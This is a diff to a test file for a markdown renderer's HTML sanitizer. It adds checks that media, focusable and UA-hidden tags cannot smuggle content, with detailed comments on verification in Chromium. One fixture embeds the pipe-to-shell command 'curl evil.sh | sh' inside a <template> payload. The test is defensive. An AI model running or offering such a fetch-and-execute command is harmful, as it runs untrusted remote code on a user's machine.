@@ -479,6 +479,21 @@ describe('the style attribute: one profile, and every surface uses it (#436)', (
     // for those two the children go WITH the element rather than surviving it.
     // The divergence has a row of its own in the #625 block; here the guard has
     // to be prose the payload could not have eaten.
+    //
+    // WHICH COLUMN IS ON TRIAL, the same note the `styled` table carries above
+    // and for the same reason. Mutation-verified 2026-08-21 — `FORBID_TAGS`
+    // reverted to #612's eleven, and the exact result written down rather than
+    // guessed at, because the first draft of this note guessed and was wrong:
+    //
+    //  - FEED and UPDATE DIALOG: all nine rows red, both columns. 18 of the 27
+    //    cells, and they are what detects the drift.
+    //  - DOCUMENT VIEWER: four red (`picture`, `area`, `canvas`, `dialog`) and
+    //    FIVE GREEN — the `audio` ×2 and `video` rows, and also the `source` and
+    //    `track` rows, whose payloads wrap the child in a `<video>`.
+    //    `decorateDocument` runs `stripMedia`, which removes `video, audio,
+    //    iframe, embed, object` whatever the profile did, so those five cells are
+    //    BELT AND BRACES: they map "the viewer renders through this pipeline"
+    //    and they are not evidence for the profile.
     [
       'a media player with a tab stop and a Download menu',
       'Listen to this:\n\n<audio controls src="https://evil.test/a.mp3">A</audio>',
@@ -1458,6 +1473,7 @@ describe('content cannot plant a media player, a hot spot or a hidden box (#625)
     expect(renderMarkdown('<embed src="x.swf" type="application/x-shockwave-flash">')).not.toContain(
       '<embed'
     );
+    expect(renderMarkdown('<param name="a" value="b">')).not.toContain('<param');
     // `object` keeps its children, which is `KEEP_CONTENT` doing the same job
     // it does for everything above.
     const obj = renderMarkdown('<object data="x.pdf">fallback prose</object>');
@@ -1517,18 +1533,27 @@ describe('content cannot plant a media player, a hot spot or a hidden box (#625)
     expect(imap).not.toMatch(/<\s*(map|area)\b/i);
   });
 
-  it('every tab stop content can create is a link, a disclosure triangle, or ours', () => {
-    // THE CLAIM #598 REACHED FOR AND #612 HAD TO STRIKE OUT, pinned this time
-    // instead of asserted — because the way it went false the first time was by
-    // being written into a comment and not re-checked when the next payload
-    // arrived.
+  it('no element the profile still admits is focusable by default but `a[href]` and `summary`', () => {
+    // NOT "every tab stop in rendered content is a link, a disclosure or ours".
+    // That sentence was written on this branch and struck out in review — the
+    // THIRD time this family has had to strike an absolute (#598's, #612's,
+    // this one) — because focus is not only a tag property:
     //
-    // The selector is the HTML "focusable without a tabindex" set as it exists
-    // after this change. Verified in Chromium 149 rather than reasoned about:
+    //   Chromium makes an OVERFLOWING SCROLL CONTAINER keyboard-focusable
+    //   (127+), and `.feed-md pre` is `overflow-x: auto` in `tokens.css`. So a
+    //   code fence with a line wider than the pane IS a tab stop, and CONTENT
+    //   decides whether it overflows. Verified in Chromium 149: a 400-character
+    //   fence takes focus, the same fence with a short line does not.
+    //   JSDOM HAS NO LAYOUT, so this row cannot see that case and neither can
+    //   any unit test in this repo. It is recorded here so the next reader does
+    //   not mistake a green run for a proof of the stronger claim.
+    //
+    // What IS pinned here is the tag-driven half, which is what a tag list can
+    // actually deliver. The selector is the "focusable without a tabindex" set
+    // by ELEMENT. Also verified in Chromium 149 rather than reasoned about:
     // `<audio controls>` takes focus and lays out at 300×54, the same element
     // without `controls` does not, and an `<area href>` in an applied `<map>`
-    // really is a stop. jsdom does not implement focusability, so this row asks
-    // the question the only way a unit test can — of the ELEMENTS.
+    // really is a stop.
     const FOCUSABLE_BY_DEFAULT =
       'a[href], area[href], audio[controls], video[controls], button, input, select, textarea, summary, iframe, embed, object, [contenteditable], [tabindex]';
     const feed = document.createElement('div');
@@ -1597,6 +1622,30 @@ describe('content cannot plant a media player, a hot spot or a hidden box (#625)
     expect(html).toContain('<details>');
     expect(html).toContain('<summary>more</summary>');
     expect(html).toContain('href="https://example.invalid/x"');
+  });
+
+  it('`<template>` is UA-hidden too and is deliberately LEFT — because it is inert', () => {
+    // #612 wrote "`rp` is the last UA-hidden tag in the profile" and #625 found
+    // `<dialog>` one tag over. So the correction had better not repeat the move:
+    // `<template>` is `display: none` as well, it IS in the profile, and it is
+    // NOT forbidden. This row is the reason that is safe, checked rather than
+    // asserted — the parser puts a template's children in a separate
+    // `DocumentFragment` on `.content`, so they are not children at all.
+    const html = renderMarkdown('<p>visible</p><template><pre>curl evil.sh | sh</pre></template>');
+    expect(html).toContain('<template');
+
+    const host = document.createElement('div');
+    host.innerHTML = html;
+    // The three ways the `datalist` attack worked, all closed by that fragment:
+    // no `<pre>` for a decoration pass to wrap in a Copy button…
+    expect(host.querySelector('pre')).toBeNull();
+    // …nothing for either find walker to hit…
+    expect(host.textContent).not.toContain('curl evil.sh | sh');
+    // …and the payload is reachable only through `.content`, which nothing in
+    // this app looks at. If a `marked` or DOMPurify change ever hoists it into
+    // the document, the two rows above go red and the tag needs the list.
+    const tpl = host.querySelector('template');
+    expect(tpl?.content.querySelector('pre')?.textContent).toBe('curl evil.sh | sh');
   });
 
   it('a code fence about a media tag still renders it as CODE, not as markup', () => {
